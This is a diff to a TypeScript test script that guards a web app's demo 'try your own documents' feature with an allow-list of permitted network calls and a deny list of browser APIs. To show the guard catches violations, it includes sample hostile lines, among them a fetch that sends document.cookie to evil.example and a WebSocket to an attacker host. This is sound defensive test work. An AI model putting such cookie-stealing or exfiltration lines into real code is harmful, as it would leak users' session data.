@@ -115,9 +115,80 @@ if (!skipReader && fixtures.length) {
 
 /* ---------------------------------------------------------------- 5. isolation + switch */
 ok(demoFlagOn({ VITE_DEEPWELL_DEMO: 'true' }) && !demoFlagOn({}) && !demoFlagOn({ VITE_DEEPWELL_DEMO: 'false' }) && !demoFlagOn({ VITE_DEEPWELL_DEMO: true }) && !demoFlagOn(undefined), 'switch is on only for the exact string "true"');
-const demoSrc = fs.readdirSync(path.join(ROOT, 'src', 'demo')).filter((f) => /\.(ts|tsx)$/.test(f)).map((f) => fs.readFileSync(path.join(ROOT, 'src', 'demo', f), 'utf8')).join('\n');
-ok(!/from ['"](?:\.\.\/)+(?:services|store|hooks)\//.test(demoSrc) && !/@clerk\//.test(demoSrc) && !/\bfetch\(/.test(demoSrc) && !/['"`]\/api\//.test(demoSrc), 'demo page uses no sign-in, API, store or data-sync code');
-ok(!/localStorage|sessionStorage|indexedDB/.test(demoSrc), 'demo page saves nothing in the browser');
+// "Try your own documents" (tryown.ts + TryOwn.tsx) is the one deliberate exception, and a NARROW one. Every other demo file keeps the original, full rule.
+const TRYOWN_FILES = new Set(['tryown.ts', 'TryOwn.tsx']);
+const demoSrc = fs.readdirSync(path.join(ROOT, 'src', 'demo')).filter((f) => /\.(ts|tsx)$/.test(f) && !TRYOWN_FILES.has(f)).map((f) => fs.readFileSync(path.join(ROOT, 'src', 'demo', f), 'utf8')).join('\n');
+const strictDemoViolations = (src: string): boolean => /from ['"](?:\.\.\/)+(?:services|store|hooks)\//.test(src) || /@clerk\//.test(src) || /\bfetch\(/.test(src) || /['"`]\/api\//.test(src);
+const strictStorageViolations = (src: string): boolean => /localStorage|sessionStorage|indexedDB/.test(src);
+ok(!strictDemoViolations(demoSrc), 'demo page uses no sign-in, API, store or data-sync code');
+ok(!strictStorageViolations(demoSrc), 'demo page saves nothing in the browser');
+
+/** Every network call in the try-own files, spelled out. Anything else (another fetch, XHR, beacon, socket, another URL, another method) is a violation. */
+const ALLOWED_CALLS = [
+  "fetcher(ENDPOINT, { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ op, ...body }) })",
+  'fetcher(`${ENDPOINT}&op=status`)',
+  "fetcher(uploads[i]!.url, { method: 'PUT', body: f })",
+];
+const callsOf = (src: string, name: string): string[] => {
+  const out: string[] = [];
+  const re = new RegExp(`(?<![\\w.$])${name}\\s*\\(`, 'g');
+  for (let m = re.exec(src); m; m = re.exec(src)) {
+    let depth = 0, k = m.index + m[0].length - 1;
+    for (; k < src.length; k++) { const c = src[k]; if (c === '(') depth++; else if (c === ')' && --depth === 0) break; }
+    out.push(src.slice(m.index, k + 1).replace(/\s+/g, ' '));
+  }
+  return out;
+};
+/** @returns the list of rule breaks in one try-own file (empty = clean) */
+export function tryownViolations(file: string, src: string): string[] {
+  const v: string[] = [];
+  const bare = src.replace(/\/\*[\s\S]*?\*\/|(^|[^:])\/\/.*$/gm, '$1'); // comments are not code
+  if (/\bfetch\s*\(/.test(bare)) v.push('direct fetch( call');
+  for (const word of ['XMLHttpRequest', 'sendBeacon', 'WebSocket', 'EventSource', 'document.cookie', 'localStorage', 'indexedDB', 'eval(', 'new Function', 'importScripts', 'window.open', 'postMessage', 'navigator.', 'import(', 'Worker(']) if (bare.includes(word)) v.push(`forbidden: ${word}`);
+  if (/@clerk\/|from ['"](?:\.\.\/)+(?:services|store|hooks)\//.test(bare)) v.push('sign-in / store / data-sync import');
+  for (const m of bare.matchAll(/from\s+['"]([^'"]+)['"]/g)) if (!['react', 'lucide-react', './tryown'].includes(m[1]!)) v.push(`import from ${m[1]}`);
+  for (const m of bare.matchAll(/(['"`])((?:(?!\1)[^\\\n]|\\.)*)\1/g)) { // string literals that look like a destination
+    const lit = m[2]!;
+    if (/^(?:https?:)?\/\//i.test(lit) || /\/api\//.test(lit)) { if (lit !== '/api/account?action=demo-try') v.push(`URL literal ${lit.slice(0, 50)}`); }
+  }
+  if (file === 'TryOwn.tsx') { if (/\bfetcher\b|\bfetch\b/.test(bare.replace(/fetchStatus/g, ''))) v.push('network access outside tryown.ts'); }
+  else {
+    const calls = callsOf(bare, 'fetcher');
+    for (const c of calls) if (!ALLOWED_CALLS.includes(c)) v.push(`network call not on the allow-list: ${c.slice(0, 90)}`);
+    for (const a of ALLOWED_CALLS) if (!calls.includes(a)) v.push(`allow-listed call missing: ${a.slice(0, 50)}`);
+    if (!/const ENDPOINT = '\/api\/account\?action=demo-try';/.test(bare)) v.push('ENDPOINT is not exactly /api/account?action=demo-try');
+    if (!/const uploads = p\.uploads as Array<\{ url: string \}>;/.test(bare)) v.push('upload URLs do not come from the presign response');
+    if ((bare.match(/ENDPOINT/g) ?? []).length !== 3) v.push('ENDPOINT used somewhere unexpected');
+    const ss = [...bare.matchAll(/sessionStorage/g)].length;
+    if (ss !== 2 || !/storage: Pick<Storage, 'getItem' \| 'setItem'> \| null = typeof sessionStorage === 'undefined' \? null : sessionStorage/.test(bare)) v.push('sessionStorage used other than as the session-id default');
+    for (const m of bare.matchAll(/\.setItem\(([^,)]*)/g)) if (m[1]!.trim() !== 'SID_KEY') v.push('setItem of something other than the session id');
+    for (const m of bare.matchAll(/\.getItem\(([^)]*)/g)) if (m[1]!.trim() !== 'SID_KEY') v.push('getItem of something other than the session id');
+  }
+  return v;
+}
+for (const f of TRYOWN_FILES) { const vs = tryownViolations(f, fs.readFileSync(path.join(ROOT, 'src', 'demo', f), 'utf8')); ok(vs.length === 0, `try-your-own file ${f}: only the allow-listed endpoint calls, no other network or storage use${vs.length ? ' [' + vs.join('; ') + ']' : ''}`); }
+{
+  // the guard must actually bite: each of these edits to the real files has to be caught
+  const real = fs.readFileSync(path.join(ROOT, 'src', 'demo', 'tryown.ts'), 'utf8');
+  const realUi = fs.readFileSync(path.join(ROOT, 'src', 'demo', 'TryOwn.tsx'), 'utf8');
+  const bad: Array<[string, string, string]> = [
+    ['an evil fetch', 'tryown.ts', real + '\nfetch("https://evil.example/x?"+document.cookie);'],
+    ['a second fetcher call to another URL', 'tryown.ts', real + '\nvoid fetcher("https://evil.example/steal", { method: "POST", body: "x" });'],
+    ['a fetcher call to the demo endpoint with a different method', 'tryown.ts', real.replace("method: 'PUT'", "method: 'DELETE'")],
+    ['the endpoint pointed elsewhere', 'tryown.ts', real.replace("'/api/account?action=demo-try'", "'/api/v1?action=export'")],
+    ['sendBeacon', 'tryown.ts', real + '\nnavigator.sendBeacon("/x", "y");'],
+    ['a WebSocket', 'tryown.ts', real + '\nnew WebSocket("wss://evil.example");'],
+    ['XMLHttpRequest', 'tryown.ts', real + '\nnew XMLHttpRequest();'],
+    ['reading other storage', 'tryown.ts', real + '\nvoid sessionStorage.getItem("other");'],
+    ['storing the document text', 'tryown.ts', real.replace('storage.setItem(SID_KEY, sid);', 'storage.setItem("doc", JSON.stringify(sid));')],
+    ['the upload URL taken from elsewhere', 'tryown.ts', real.replace('const uploads = p.uploads as Array<{ url: string }>;', 'const uploads = [{ url: "https://evil.example" }] as Array<{ url: string }>;')],
+    ['a fetch in the panel', 'TryOwn.tsx', realUi + '\nvoid fetch("/api/anything");'],
+    ['a new import in the panel', 'TryOwn.tsx', realUi.replace("from 'react';", "from 'react';\nimport axios from 'axios';")],
+  ];
+  for (const [name, file, src] of bad) ok(tryownViolations(file, src).length > 0, `gate catches: ${name}`);
+  // and every OTHER demo file stays under the original full rule
+  ok(strictDemoViolations('fetch("/x")') && strictDemoViolations("const u = '/api/account?action=demo-try'") && strictStorageViolations('sessionStorage.getItem("a")'), 'every other demo file is still held to the original rule (no fetch, no /api/, no storage), even for the demo-try endpoint');
+}
 const appSrc = (dir: string): string[] => fs.readdirSync(dir, { withFileTypes: true }).flatMap((e) => e.isDirectory() ? (e.name === 'demo' ? [] : appSrc(path.join(dir, e.name))) : /\.(ts|tsx)$/.test(e.name) ? [path.join(dir, e.name)] : []);
 ok(appSrc(path.join(ROOT, 'src')).every((f) => !/demo\/fixtures|from ['"][./]*demo\//.test(fs.readFileSync(f, 'utf8'))), 'the signed-in app never imports the demo workspaces');
 const apiTop = fs.readdirSync(path.join(ROOT, 'api'), { withFileTypes: true }).filter((e) => e.isFile());
